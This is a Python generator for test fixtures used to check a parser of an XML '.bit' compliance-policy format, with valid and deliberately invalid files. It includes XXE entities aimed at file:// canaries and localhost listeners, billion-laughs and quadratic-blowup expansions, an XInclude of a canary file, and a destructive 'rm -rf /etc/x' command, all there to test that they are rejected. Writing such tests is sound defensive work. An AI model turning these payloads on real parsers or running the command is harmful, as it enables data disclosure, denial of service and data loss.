"""Generate bits/tests/** fixtures and manifest.json (tester-owned; rerun after editing, then check_fixtures.py).

Every expected value comes from SR, TS and the approved M7 answers (#2, #10,
#13, #16, #17, #105, #108, #109, #110), never from product code.
Usage (from the repo root): python -I bits/tests/generate_fixtures.py bits/tests
"""

import hashlib
import json
import sys
import uuid
from pathlib import Path

OUT = Path(sys.argv[1])
NS = uuid.UUID("6d1f0c3e-6a51-4f53-9b0a-5d0b4a7e2c11")
MANIFEST: list[dict] = []

SR_EXAMPLE = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<Policy formatVersion="1.0">\n'
    "  <PolicyName>CIS Ubuntu 24.04 Level 1 - Server</PolicyName>\n"
    "  <PolicyDescription>CIS Benchmark Level 1 controls for Ubuntu 24.04 servers.</PolicyDescription>\n"
    "  <PolicyStatus>enabled</PolicyStatus>\n"
    "  <Family>\n"
    "    <FamilyName>CIS Ubuntu 24.04</FamilyName>\n"
    "  </Family>\n"
    "  <PluginsGroups>\n"
    "    <Plugin>\n"
    "      <PluginName>1.3.1.1 - Ensure AppArmor is installed</PluginName>\n"
    "      <PluginDescription>Checks that the AppArmor package is installed.</PluginDescription>\n"
    "      <PluginId>3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c48</PluginId>\n"
    '      <Execute timeout="30"><![CDATA[\n'
    "        dpkg-query -W -f='${Status}' apparmor 2>/dev/null\n"
    "      ]]></Execute>\n"
    "      <Operator>equals</Operator>\n"
    "      <ExpectedResult>install ok installed</ExpectedResult>\n"
    "    </Plugin>\n"
    "  </PluginsGroups>\n"
    "</Policy>\n"
)


def uid(key: str) -> str:
    return str(uuid.uuid5(NS, key))


def plugin(fx: str, i: int, **kw: object) -> dict:
    p = {
        "name": f"{i}.1 - Fixture check {i}",
        "desc": f"Fixture plugin {i}.",
        "id": uid(f"{fx}/{i}"),
        "execute": "dpkg-query -W -f='${Status}' apparmor 2>/dev/null",
        "timeout": "30",
        "operator": "equals",
        "expected": "install ok installed",
    }
    p.update(kw)
    return p


def build(
    fx: str,
    note: str,
    *,
    name: str | None = None,
    desc: str = "Bitscan test fixture.",
    status: str = "enabled",
    family: str = "Bitscan Test Family",
    plugins: list[dict] | None = None,
    root_attrs: str = ' formatVersion="1.0"',
    decl: str = '<?xml version="1.0" encoding="UTF-8"?>',
) -> str:
    """One .bit text; a comment after the declaration names the rule broken."""
    if plugins is None:
        plugins = [plugin(fx, 1)]
    lines = []
    if decl:
        lines.append(decl)
    lines.append(f"<!-- bits/tests fixture {fx}: {note} -->")
    lines.append(f"<Policy{root_attrs}>")
    lines.append(f"  <PolicyName>{name if name is not None else 'Fixture ' + fx}</PolicyName>")
    lines.append(f"  <PolicyDescription>{desc}</PolicyDescription>")
    lines.append(f"  <PolicyStatus>{status}</PolicyStatus>")
    lines.append("  <Family>")
    lines.append(f"    <FamilyName>{family}</FamilyName>")
    lines.append("  </Family>")
    lines.append("  <PluginsGroups>")
    for p in plugins:
        if "raw" in p:
            lines.extend(p["raw"])
            continue
        lines.append("    <Plugin>")
        lines.append(f"      <PluginName>{p['name']}</PluginName>")
        lines.append(f"      <PluginDescription>{p['desc']}</PluginDescription>")
        lines.append(f"      <PluginId>{p['id']}</PluginId>")
        t = "" if p["timeout"] is None else f' timeout="{p["timeout"]}"'
        lines.append(f"      <Execute{t}><![CDATA[{p['execute']}]]></Execute>")
        if p.get("operator") is not None:
            lines.append(f"      <Operator>{p['operator']}</Operator>")
        if p.get("expected") is not None:
            lines.append(f"      <ExpectedResult>{p['expected']}</ExpectedResult>")
        lines.append("    </Plugin>")
    lines.append("  </PluginsGroups>")
    lines.append("</Policy>")
    return "\n".join(lines) + "\n"


def line_of(text: str, needle: str, nth: int = 1) -> int:
    seen = 0
    for no, line in enumerate(text.split("\n"), 1):
        if needle in line:
            seen += 1
            if seen == nth:
                return no
    raise AssertionError(f"{needle!r} #{nth} not found")


def emit(
    rel: str,
    data: str | bytes,
    codes: list[str],
    note: str,
    *,
    lines: list[int] | None = None,
    element: str | None = None,
    element_prefix: str | None = None,
    placeholders: list[str] | None = None,
    outcome: str | None = None,
) -> None:
    raw = data.encode("utf-8") if isinstance(data, str) else data
    path = OUT / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(raw)
    entry: dict = {
        "file": rel,
        "codes": codes,
        "note": note,
        "sha256": hashlib.sha256(raw).hexdigest(),
        "outcome": outcome
        or ("rejected" if any(c not in ("BIT101", "BIT103") for c in codes) else "success"),
    }
    if lines is not None:
        entry["lines"] = lines
    if element is not None:
        entry["element"] = element
    if element_prefix is not None:
        entry["element_prefix"] = element_prefix
    if placeholders:
        entry["placeholders"] = placeholders
    MANIFEST.append(entry)


PG = "Policy/PluginsGroups"

# ---------------------------------------------------------------- valid
emit("valid/sr-1.1-example.bit", SR_EXAMPLE, [], "SR §1.1 canonical example, byte-identical")

fx = "valid/three-plugins"
emit(
    f"{fx}.bit",
    build(fx, "valid, three plugins in document order", plugins=[
        plugin(fx, 1),
        plugin(fx, 2, execute="sysctl -n kernel.randomize_va_space", operator="eq", expected="2"),
        plugin(fx, 3, execute="grep -E '^\\s*PermitRootLogin' /etc/ssh/sshd_config",
               operator="regex", expected="^PermitRootLogin\\s+no$", timeout=None),
    ]),
    [], "valid, three plugins",
)

OPS = [
    ("equals", "install ok installed"), ("not_equals", "disabled"),
    ("contains", "PermitRootLogin no"), ("not_contains", "nullok"),
    ("regex", "^MaxAuthTries\\s+[1-4]$"), ("not_regex", "^\\s*PermitEmptyPasswords\\s+yes"),
    ("eq", "0"), ("ne", "-1"), ("gt", "+2.5"), ("ge", "14"), ("lt", "91"), ("le", "90"),
    ("empty", ""), ("not_empty", ""),
]
fx = "valid/all-operators"
emit(
    f"{fx}.bit",
    build(fx, "valid, each of the 14 SR §2.4 operators once", plugins=[
        plugin(fx, i, operator=op, expected=exp) for i, (op, exp) in enumerate(OPS, 1)
    ]),
    [], "14 operators with consistent ExpectedResult",
)

fx = "valid/mixed-case-values"
emit(
    f"{fx}.bit",
    build(fx, "PolicyStatus ENABLED and Operator EQUALS (case-insensitive, stored lowercase)",
          status="ENABLED", plugins=[plugin(fx, 1, operator="EQUALS"),
                                     plugin(fx, 2, operator="Not_Empty", expected="")]),
    [], "case-insensitive enums",
)

fx = "valid/disabled"
emit(f"{fx}.bit", build(fx, "PolicyStatus Disabled", status="Disabled"), [], "disabled file status")

fx = "valid/utf8-bom"
emit(f"{fx}.bit", b"\xef\xbb\xbf" + build(fx, "UTF-8 BOM allowed (#105 (f))").encode(), [],
     "UTF-8 BOM")

fx = "valid/no-declaration"
emit(f"{fx}.bit", build(fx, "no XML declaration (#105 (f))", decl=""), [], "no declaration")

fx = "valid/lowercase-encoding"
emit(f"{fx}.bit", build(fx, "encoding utf-8 lower case",
                        decl='<?xml version="1.0" encoding="utf-8"?>'), [], "utf-8 any case")

fx = "valid/no-format-version"
emit(f"{fx}.bit", build(fx, "formatVersion absent (default 1.0)", root_attrs=""), [],
     "formatVersion absent")

fx = "valid/comments"
t = build(fx, "comments everywhere, never part of a value", plugins=[plugin(fx, 1)])
t = t.replace("<PolicyName>", "<!-- c1 --><PolicyName>")
t = t.replace("</FamilyName>", "</FamilyName><!-- c2 -->")
t = t.replace("<![CDATA[dpkg-query", "<!-- c3 --><![CDATA[dpkg-query")
t = t.replace("<ExpectedResult>install ok installed",
              "<ExpectedResult>install ok<!-- c4 --> installed")
emit(f"{fx}.bit", t, [], "comments ignored; ExpectedResult is 'install ok installed'")

fx = "valid/plain-text-execute"
t = build(fx, "Execute as plain text with entity escapes, and CDATA plus text joined", plugins=[
    plugin(fx, 1), plugin(fx, 2)])
t = t.replace(
    "<Execute timeout=\"30\"><![CDATA[dpkg-query -W -f='${Status}' apparmor 2>/dev/null]]></Execute>",
    "<Execute timeout=\"30\">test -f /etc/issue &amp;&amp; stat -c %a /etc/issue 2&gt;/dev/null</Execute>",
    1,
)
t = t.replace(
    "<Execute timeout=\"30\"><![CDATA[dpkg-query -W -f='${Status}' apparmor 2>/dev/null]]></Execute>",
    "<Execute timeout=\"30\">dpkg-query -W <![CDATA[-f='${Status}']]> apparmor</Execute>",
    1,
)
emit(f"{fx}.bit", t, [],
     "plugin 1 execute 'test -f /etc/issue && stat -c %a /etc/issue 2>/dev/null'; "
     "plugin 2 execute \"dpkg-query -W -f='${Status}' apparmor\"")

fx = "valid/timeout-bounds"
emit(f"{fx}.bit", build(fx, "timeout 1, 600, 0600 (leading zeros) and absent (60)", plugins=[
    plugin(fx, 1, timeout="1"), plugin(fx, 2, timeout="600"),
    plugin(fx, 3, timeout="0600"), plugin(fx, 4, timeout=None)]), [],
    "timeouts 1, 600, 600, 60")

fx = "valid/unicode"
emit(f"{fx}.bit", build(fx, "multi-byte text in every text element",
                        name="Fixture unicode — Überprüfung ✓ 検査",
                        desc="Beschreibung: äöü — 説明 — émoji 🛡",
                        family="Família Ünïcode 試験",
                        plugins=[plugin(fx, 1, name="1.1 - Prüfe ✓ 検査",
                                        desc="Ελληνικά", expected="installé ✓")]),
     [], "unicode text round-trips")

fx = "valid/nbsp-name"
emit(f"{fx}.bit", build(fx, "PolicyName holds U+00A0 at both ends; only XML whitespace is trimmed (#17)",
                        name="\u00a0Fixture nbsp\u00a0"),
     [], "stored policy_name keeps both U+00A0")

fx = "valid/warnings-only"
emit(f"{fx}.bit", build(fx, "only warnings: BIT101 (no control ref) and BIT103 (33-char ref)", plugins=[
    plugin(fx, 1, name="Ensure AppArmor is installed"),
    plugin(fx, 2, name="1." * 16 + "1 - Thirty-three character reference"),
    plugin(fx, 3, name="1." * 15 + "1 - Thirty-one character reference kept"),
]), ["BIT101", "BIT103"], "warnings never reject (#110); plugin 3 ref (31 chars) kept",
    outcome="success")

# ---------------------------------------------------------------- BIT001
B1 = ["BIT001"]


def sr_with(fx: str, note: str, doctype: str = "", desc: str | None = None,
            decl: str = '<?xml version="1.0" encoding="UTF-8"?>') -> str:
    t = build(fx, note, decl=decl)
    if doctype:
        t = t.replace("<Policy formatVersion", doctype + "\n<Policy formatVersion", 1)
    if desc is not None:
        t = t.replace("<PolicyDescription>Bitscan test fixture.</PolicyDescription>",
                      f"<PolicyDescription>{desc}</PolicyDescription>")
    return t


emit("bit001/xxe-file.bit",
     sr_with("bit001/xxe-file", "external entity by file:// (XXE)",
             '<!DOCTYPE Policy [<!ENTITY xxe SYSTEM "file://@@CANARY@@">]>', "&xxe;"),
     B1, "XXE file; the canary content must never appear and the file is never opened",
     placeholders=["@@CANARY@@"])
emit("bit001/xxe-url.bit",
     sr_with("bit001/xxe-url", "external entity by http:// (XXE)",
             '<!DOCTYPE Policy [<!ENTITY xxe SYSTEM "http://127.0.0.1:@@PORT@@/xxe">]>', "&xxe;"),
     B1, "XXE URL; the listener must see no connection", placeholders=["@@PORT@@"])
emit("bit001/parameter-entity.bit",
     sr_with("bit001/parameter-entity", "external parameter entity",
             '<!DOCTYPE Policy [<!ENTITY % pe SYSTEM "http://127.0.0.1:@@PORT@@/pe.dtd"> %pe;]>'),
     B1, "parameter entity; no connection", placeholders=["@@PORT@@"])
emit("bit001/parameter-entity-internal.bit",
     sr_with("bit001/parameter-entity-internal", "internal parameter entity",
             '<!DOCTYPE Policy [<!ENTITY % pe "<!ENTITY x \'boom\'>"> %pe;]>', "&x;"),
     B1, "internal parameter entity")
lol = ['<!ENTITY lol0 "lol">'] + [
    f'<!ENTITY lol{i} "{("&lol" + str(i - 1) + ";") * 10}">' for i in range(1, 10)
]
emit("bit001/billion-laughs.bit",
     sr_with("bit001/billion-laughs", "billion laughs (exponential entity expansion)",
             "<!DOCTYPE Policy [\n" + "\n".join(lol) + "\n]>", "&lol9;"),
     B1, "billion laughs; < 64 MiB peak, < 2 s")
emit("bit001/quadratic-blowup.bit",
     sr_with("bit001/quadratic-blowup", "quadratic blow-up (one large entity referenced many times)",
             '<!DOCTYPE Policy [<!ENTITY a "' + "a" * 20000 + '">]>', "&a;" * 10000),
     B1, "quadratic blow-up; 20,000 chars x 10,000 refs = 200 MB if expanded")
emit("bit001/dtd-only.bit",
     sr_with("bit001/dtd-only", "DOCTYPE with no entity", "<!DOCTYPE Policy>"),
     B1, "DTD only")
emit("bit001/dtd-element-decl.bit",
     sr_with("bit001/dtd-element-decl", "internal DTD subset with an element declaration only",
             "<!DOCTYPE Policy [<!ELEMENT Policy ANY>]>"),
     B1, "DTD with element declaration only")
emit("bit001/external-dtd-url.bit",
     sr_with("bit001/external-dtd-url", "external DTD by URL",
             '<!DOCTYPE Policy SYSTEM "http://127.0.0.1:@@PORT@@/ext.dtd">'),
     B1, "external DTD; no connection", placeholders=["@@PORT@@"])
emit("bit001/external-dtd-file.bit",
     sr_with("bit001/external-dtd-file", "external DTD by file",
             '<!DOCTYPE Policy SYSTEM "file://@@CANARY@@">'),
     B1, "external DTD file; never opened", placeholders=["@@CANARY@@"])
emit("bit001/undefined-entity.bit",
     sr_with("bit001/undefined-entity", "reference to an undeclared entity", desc="&nope;"),
     B1, "undefined entity is not well-formed")
base16 = build("bit001/utf16", "UTF-16", decl='<?xml version="1.0" encoding="UTF-16"?>')
emit("bit001/utf16le-bom.bit", b"\xff\xfe" + base16.encode("utf-16-le"), B1, "UTF-16 LE with BOM")
emit("bit001/utf16be-bom.bit", b"\xfe\xff" + base16.encode("utf-16-be"), B1, "UTF-16 BE with BOM")
base32 = build("bit001/utf32", "UTF-32", decl='<?xml version="1.0" encoding="UTF-32"?>')
emit("bit001/utf32le-bom.bit", b"\xff\xfe\x00\x00" + base32.encode("utf-32-le"), B1,
     "UTF-32 LE with BOM")
t = build("bit001/iso-8859-1", "declared ISO-8859-1 with a non-ASCII byte",
          decl='<?xml version="1.0" encoding="ISO-8859-1"?>', desc="caf\u00e9")
emit("bit001/iso-8859-1.bit", t.encode("latin-1"), B1, "ISO-8859-1 declared, byte 0xE9")
t = build("bit001/iso-8859-1-ascii", "declared ISO-8859-1, ASCII content only",
          decl='<?xml version="1.0" encoding="ISO-8859-1"?>')
emit("bit001/iso-8859-1-ascii.bit", t, B1, "declared encoding other than UTF-8 (D1)")
t = build("bit001/us-ascii", "declared US-ASCII", decl='<?xml version="1.0" encoding="US-ASCII"?>')
emit("bit001/us-ascii.bit", t, B1, "declared encoding other than UTF-8 (D1)")


def bad_bytes(fx: str, note: str, bad: bytes) -> tuple[bytes, int]:
    t = build(fx, note, desc="MARK")
    ln = line_of(t, "MARK")
    return t.encode().replace(b"MARK", b"x" + bad + b"y"), ln


for name, bad, note in [
    ("invalid-utf8", b"\xc3\x28", "invalid UTF-8 continuation"),
    ("overlong-utf8", b"\xc0\xaf", "overlong UTF-8 encoding of '/'"),
    ("surrogate-utf8", b"\xed\xa0\x80", "UTF-8 encoded surrogate U+D800"),
    ("lone-continuation", b"\x80", "lone continuation byte"),
    ("truncated-utf8", b"\xe2\x82", "truncated 3-byte sequence"),
]:
    data, ln = bad_bytes(f"bit001/{name}", note, bad)
    emit(f"bit001/{name}.bit", data, B1, note + f"; first bad byte on line {ln}", lines=[ln])

t = build("bit001/not-well-formed", "missing </Policy>")
emit("bit001/not-well-formed.bit", t.replace("</Policy>\n", ""), B1, "unclosed root")
t = build("bit001/mismatched-tags", "mismatched tags")
emit("bit001/mismatched-tags.bit",
     t.replace("</PolicyName>", "</PolicyDescription>", 1), B1, "mismatched end tag",
     lines=[line_of(t, "<PolicyName>")])
emit("bit001/empty.bit", b"", B1, "empty file (0 bytes)")
emit("bit001/whitespace-only.bit", "\n   \n\t\n", B1, "whitespace only")
emit("bit001/declaration-only.bit", '<?xml version="1.0" encoding="UTF-8"?>\n', B1,
     "declaration and no root")
t = build("bit001/duplicate-attribute", "attribute given twice",
          root_attrs=' formatVersion="1.0" formatVersion="1.0"')
emit("bit001/duplicate-attribute.bit", t, B1, "duplicate attribute is not well-formed")
t = build("bit001/two-roots", "second root element")
emit("bit001/two-roots.bit", t + "<Policy/>\n", B1, "junk after document element")
t = build("bit001/text-before-root", "text before the root")
emit("bit001/text-before-root.bit", t.replace("<Policy formatVersion", "hello<Policy formatVersion"),
     B1, "text before root")
t = build("bit001/nul-char-ref", "character reference &#0;", desc="a&#0;b")
emit("bit001/nul-char-ref.bit", t, B1, "&#0; is not an XML 1.0 character")
t = build("bit001/raw-nul", "raw NUL byte in text", desc="aMARKb")
emit("bit001/raw-nul.bit", t.encode().replace(b"MARK", b"\x00"), B1, "raw U+0000")
t = build("bit001/control-char", "raw U+0001 in text", desc="aMARKb")
emit("bit001/control-char.bit", t.encode().replace(b"MARK", b"\x01"), B1,
     "raw C0 control is not an XML 1.0 character")
t = build("bit001/xml-1.1", "XML 1.1 declaration (#105 (f): XML 1.0 only)",
          decl='<?xml version="1.1" encoding="UTF-8"?>')
emit("bit001/xml-1.1.bit", t, B1, "#105 (f) XML 1.0 only")
# TS §1.4: the sample tags with spaces and mismatched case, not valid XML
ts14 = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    "<!-- bits/tests fixture bit001/sample-tag-forms: the TS §1.4 sample tag forms -->\n"
    "<Policy>\n"
    "  <Policy Name>CIS Ubuntu 24.04 Level 1 - Server</Policy Name>\n"
    "  <Policy Description>CIS Benchmark Level 1</Policy Description>\n"
    "  <Policy Status>enabled</Policy Status>\n"
    "  <Family><Family Name>CIS Ubuntu 24.04</Family Name></Family>\n"
    "  <Plugins Groups>\n"
    "    <Plugin>\n"
    "      <Plugin Name>1.3.1.1 - Ensure AppArmor is installed</Plugin Name>\n"
    "      <Plugin ID>3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c48</Plugin ID>\n"
    "      <Execute>dpkg-query -W apparmor</Execute>\n"
    "      <Operator>equals</Operator>\n"
    "      <Expected Result>install ok installed</Expected Result>\n"
    "    </Plugin>\n"
    "  </Plugins Groups>\n"
    "</Policy>\n"
)
emit("bit001/sample-tag-forms.bit", ts14, B1, "TS §1.4 sample forms with spaces (REQ-151 (3))",
     lines=[4])

# ---------------------------------------------------------------- BIT002
B2 = ["BIT002"]
fx0 = "bit002"


def b2(name: str, note: str, text: str, *, lines: list[int] | None = None,
       element_prefix: str | None = None, placeholders: list[str] | None = None) -> None:
    emit(f"bit002/{name}.bit", text, B2, note, lines=lines, element_prefix=element_prefix,
         placeholders=placeholders)


ELEMS = {
    "PolicyName": "  <PolicyName>",
    "PolicyDescription": "  <PolicyDescription>",
    "PolicyStatus": "  <PolicyStatus>",
    "FamilyName": "    <FamilyName>",
    "PluginName": "      <PluginName>",
    "PluginDescription": "      <PluginDescription>",
    "PluginId": "      <PluginId>",
    "Execute": "      <Execute",
    "Operator": "      <Operator>",
    "ExpectedResult": "      <ExpectedResult>",
}
PARENT = {
    "PolicyName": "<Policy ", "PolicyDescription": "<Policy ", "PolicyStatus": "<Policy ",
    "FamilyName": "<Family>", "PluginName": "<Plugin>", "PluginDescription": "<Plugin>",
    "PluginId": "<Plugin>", "Execute": "<Plugin>", "Operator": "<Plugin>",
    "ExpectedResult": "<Plugin>",
}
for el, prefix in ELEMS.items():
    fx = f"bit002/missing-{el}"
    base = build(fx, f"required element {el} missing")
    lines = base.split("\n")
    idx = next(i for i, l in enumerate(lines) if l.startswith(prefix))
    if el not in ("Operator", "ExpectedResult"):
        parent_line = line_of(base, PARENT[el])
        out = "\n".join(lines[:idx] + lines[idx + 1:])
        # line: the parent's start tag, or the element now in its place (#105 (g))
        b2(f"missing-{el}", f"{el} missing", out, lines=[parent_line, idx + 1])
    # duplicate
    fx = f"bit002/duplicate-{el}"
    base = build(fx, f"required element {el} twice")
    lines = base.split("\n")
    idx = next(i for i, l in enumerate(lines) if l.startswith(prefix))
    out = "\n".join(lines[: idx + 1] + [lines[idx]] + lines[idx + 1:])
    b2(f"duplicate-{el}", f"{el} twice", out, lines=[idx + 2])

for el, block in [("Family", ("  <Family>", 3)), ("PluginsGroups", None)]:
    fx = f"bit002/missing-{el}"
    base = build(fx, f"{el} missing")
    lines = base.split("\n")
    if el == "Family":
        s = next(i for i, l in enumerate(lines) if l == "  <Family>")
        out_lines = lines[:s] + lines[s + 3:]
    else:
        s = next(i for i, l in enumerate(lines) if l == "  <PluginsGroups>")
        e = next(i for i, l in enumerate(lines) if l == "  </PluginsGroups>")
        out_lines = lines[:s] + lines[e + 1:]
    b2(f"missing-{el}", f"{el} missing", "\n".join(out_lines),
       lines=[line_of(base, "<Policy "), s + 1])

# order swaps (each pair adjacent)
for a, b in [("PolicyName", "PolicyDescription"), ("PolicyStatus", None),
             ("PluginId", "Execute"), ("Operator", "ExpectedResult"),
             ("PluginName", "PluginDescription")]:
    fx = f"bit002/order-{a}"
    base = build(fx, f"{a} out of order")
    lines = base.split("\n")
    if b is None:  # PolicyStatus after Family
        s = next(i for i, l in enumerate(lines) if l.startswith("  <PolicyStatus>"))
        st = lines.pop(s)
        e = next(i for i, l in enumerate(lines) if l == "  </Family>")
        lines.insert(e + 1, st)
        b2(f"order-{a}", "PolicyStatus after Family", "\n".join(lines), lines=[s + 1, e + 2])
        continue
    ia = next(i for i, l in enumerate(lines) if l.startswith(ELEMS[a]))
    ib = next(i for i, l in enumerate(lines) if l.startswith(ELEMS[b]))
    lines[ia], lines[ib] = lines[ib], lines[ia]
    b2(f"order-{a}", f"{a} and {b} swapped", "\n".join(lines), lines=[ia + 1, ib + 1])

fx = "bit002/miscased-policyName"
t = build(fx, "mis-cased element name <policyName>")
t = t.replace("<PolicyName>", "<policyName>").replace("</PolicyName>", "</policyName>")
b2("miscased-policyName", "<policyName>", t,
   lines=[line_of(t, "<Policy "), line_of(t, "  <policyName>")])
fx = "bit002/miscased-plugin"
t = build(fx, "mis-cased element name <plugin>")
t = t.replace("<Plugin>", "<plugin>").replace("</Plugin>", "</plugin>")
b2("miscased-plugin", "<plugin>", t,
   lines=[line_of(t, "  <PluginsGroups>"), line_of(t, "    <plugin>")])
fx = "bit002/wrong-root"
t = build(fx, "root element Policies").replace("<Policy formatVersion", "<Policies formatVersion")
t = t.replace("</Policy>\n", "</Policies>\n")
b2("wrong-root", "root not Policy", t, lines=[line_of(t, "<Policies")])
fx = "bit002/second-family"
t = build(fx, "a second Family (#10)")
t = t.replace("  </Family>\n", "  </Family>\n  <Family>\n    <FamilyName>Other</FamilyName>\n  </Family>\n", 1)
b2("second-family", "two Family elements", t, lines=[line_of(t, "  <Family>", 2)])
fx = "bit002/empty-pluginsgroups"
t = build(fx, "empty PluginsGroups (#16)", plugins=[])
b2("empty-pluginsgroups", "PluginsGroups with no Plugin", t,
   lines=[line_of(t, "<PluginsGroups>")])
fx = "bit002/selfclosing-pluginsgroups"
t = build(fx, "self-closing PluginsGroups (#16)", plugins=[])
t = t.replace("  <PluginsGroups>\n  </PluginsGroups>", "  <PluginsGroups/>")
b2("selfclosing-pluginsgroups", "<PluginsGroups/>", t, lines=[line_of(t, "<PluginsGroups/>")])
fx = "bit002/unknown-element-policy"
t = build(fx, "unknown element Author in Policy")
t = t.replace("  <Family>\n", "  <Author>me</Author>\n  <Family>\n", 1)
b2("unknown-element-policy", "unknown <Author>", t, lines=[line_of(t, "<Author>")])
fx = "bit002/unknown-element-plugin"
t = build(fx, "unknown element Severity in Plugin")
t = t.replace("      <Operator>", "      <Severity>high</Severity>\n      <Operator>", 1)
b2("unknown-element-plugin", "unknown <Severity>", t, lines=[line_of(t, "<Severity>")])
fx = "bit002/unknown-attr-root"
t = build(fx, "unknown attribute id on Policy", root_attrs=' formatVersion="1.0" id="x"')
b2("unknown-attr-root", "Policy/@id", t, lines=[line_of(t, "<Policy ")])
fx = "bit002/unknown-attr-plugin"
t = build(fx, "unknown attribute on Plugin").replace("<Plugin>", '<Plugin id="1">', 1)
b2("unknown-attr-plugin", "Plugin/@id", t, lines=[line_of(t, '<Plugin id="1">')])
fx = "bit002/unknown-attr-execute"
t = build(fx, "unknown attribute user on Execute").replace(
    '<Execute timeout="30">', '<Execute timeout="30" user="root">', 1)
b2("unknown-attr-execute", "Execute/@user", t, lines=[line_of(t, 'user="root"')])
fx = "bit002/attr-on-leaf"
t = build(fx, "attribute on a leaf element").replace("<PolicyName>", '<PolicyName lang="en">', 1)
b2("attr-on-leaf", "PolicyName/@lang", t, lines=[line_of(t, "<PolicyName")])
fx = "bit002/text-in-family"
t = build(fx, "non-whitespace text in container Family").replace(
    "  <Family>\n", "  <Family>stray\n", 1)
b2("text-in-family", "text in Family", t, lines=[line_of(t, "<Family>stray")])
fx = "bit002/text-in-plugin"
t = build(fx, "non-whitespace text in container Plugin").replace(
    "      <Operator>", "      stray<Operator>", 1)
b2("text-in-plugin", "text in Plugin", t,
   lines=[line_of(t, "<Plugin>"), line_of(t, "stray<Operator>")])
fx = "bit002/child-in-leaf"
t = build(fx, "child element inside leaf PolicyName").replace(
    "<PolicyName>Fixture bit002/child-in-leaf</PolicyName>",
    "<PolicyName>Fixture <b>bold</b></PolicyName>", 1)
b2("child-in-leaf", "<b> in PolicyName", t, lines=[line_of(t, "<b>bold")])
fx = "bit002/processing-instruction"
t = build(fx, "processing instruction inside Policy (#105 (c))").replace(
    "  <Family>\n", "  <?php echo 1 ?>\n  <Family>\n", 1)
b2("processing-instruction", "PI in Policy", t, lines=[line_of(t, "<?php")])
fx = "bit002/pi-before-root"
t = build(fx, "processing instruction before the root (#105 (c))").replace(
    "<Policy formatVersion", '<?xml-stylesheet href="x.xsl"?>\n<Policy formatVersion', 1)
b2("pi-before-root", "xml-stylesheet PI", t, lines=[line_of(t, "<?xml-stylesheet")])
fx = "bit002/namespace-default"
t = build(fx, "default namespace on Policy (#105 (c))",
          root_attrs=' formatVersion="1.0" xmlns="urn:bitscan:x"')
b2("namespace-default", "xmlns", t, lines=[line_of(t, "<Policy ")])
fx = "bit002/namespace-prefixed"
t = build(fx, "prefixed element (#105 (c))").replace(
    "<PolicyName>Fixture bit002/namespace-prefixed</PolicyName>",
    '<b:PolicyName xmlns:b="urn:b">Fixture ns</b:PolicyName>', 1)
b2("namespace-prefixed", "b:PolicyName", t, lines=[line_of(t, "<b:PolicyName")])
fx = "bit002/xinclude"
t = build(fx, "XInclude element (namespace, #105 (c)); never fetched").replace(
    "<PolicyDescription>Bitscan test fixture.</PolicyDescription>",
    '<PolicyDescription><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
    'href="file://@@CANARY@@" parse="text"/></PolicyDescription>', 1)
b2("xinclude", "xi:include; canary never read", t, lines=[line_of(t, "xi:include")],
   placeholders=["@@CANARY@@"])
fx = "bit002/nine-attributes"
attrs = ' formatVersion="1.0"' + "".join(f' a{i}="{i}"' for i in range(1, 9))
t = build(fx, "nine attributes on Policy (#105 (a))", root_attrs=attrs)
b2("nine-attributes", "9 attributes", t, lines=[line_of(t, "<Policy ")])
fx = "bit002/depth-17"
t = build(fx, "nesting deeper than 16 (#105 (a))").replace(
    "<PolicyDescription>Bitscan test fixture.</PolicyDescription>",
    "<PolicyDescription>" + "<d>" * 15 + "x" + "</d>" * 15 + "</PolicyDescription>", 1)
b2("depth-17", "17 levels", t, lines=[line_of(t, "<PolicyDescription>")])
fx = "bit002/plus-bit003"
t = build(fx, "BIT002 (duplicate PolicyName) and a BIT003 fault: only BIT002 is reported",
          status="on")
t = t.replace("  <PolicyDescription>", "  <PolicyName>again</PolicyName>\n  <PolicyDescription>", 1)
b2("plus-bit003", "BIT002 masks BIT003 (REQ-151 (6))", t, lines=[line_of(t, "again")])
fx = "bit002/plus-bit016"
t = build(fx, "BIT002 (unknown element) and formatVersion 1.1: only BIT002",
          root_attrs=' formatVersion="1.1"')
t = t.replace("  <Family>\n", "  <Author>me</Author>\n  <Family>\n", 1)
b2("plus-bit016", "BIT002 masks BIT016", t, lines=[line_of(t, "<Author>")])
fx = "bit002/plus-bit102"
t = build(fx, "BIT002 and a BIT102 command: only BIT002", plugins=[
    plugin(fx, 1, execute="rm -rf /etc/x")])
t = t.replace("  <Family>\n", "  <Author>me</Author>\n  <Family>\n", 1)
b2("plus-bit102", "BIT002 masks BIT102", t, lines=[line_of(t, "<Author>")])

# ---------------------------------------------------------------- content codes (one each)


def content(code: str, name: str, note: str, text: str, needle: str, element: str,
            nth: int = 1, extra_codes: list[str] | None = None) -> None:
    emit(f"content/{code.lower()}-{name}.bit", text, [code] + (extra_codes or []), note,
         lines=[line_of(text, needle, nth)], element=element)


P1 = f"{PG}/Plugin[1]"
P2 = f"{PG}/Plugin[2]"
for name, val in [("on", "on"), ("empty", ""), ("enabled-space-inside", "en abled")]:
    fx = f"content/bit003-{name}"
    t = build(fx, f"PolicyStatus {val!r}", status=val)
    content("BIT003", name, f"PolicyStatus {val!r}", t, "<PolicyStatus>", "Policy/PolicyStatus")
for name, val in [
    ("uppercase", "3F6C2A9E-8B1D-4E57-9A3C-2D7F0E6B1C48"),
    ("mixed-case", "3f6c2a9e-8b1d-4E57-9a3c-2d7f0e6b1c48"),
    ("braced", "{3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c48}"),
    ("urn", "urn:uuid:3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c48"),
    ("unhyphenated", "3f6c2a9e8b1d4e579a3c2d7f0e6b1c48"),
    ("short", "3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c4"),
    ("non-hex", "3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c4g"),
    ("empty", ""),
]:
    fx = f"content/bit004-{name}"
    t = build(fx, f"PluginId {name} (#109)", plugins=[plugin(fx, 1, id=val)])
    content("BIT004", name, f"PluginId {val!r}", t, "<PluginId>", f"{P1}/PluginId")
fx = "content/bit005-duplicate-id"
dup = uid(fx)
t = build(fx, "two plugins with one PluginId: BIT005 on the second",
          plugins=[plugin(fx, 1, id=dup), plugin(fx, 2, id=dup)])
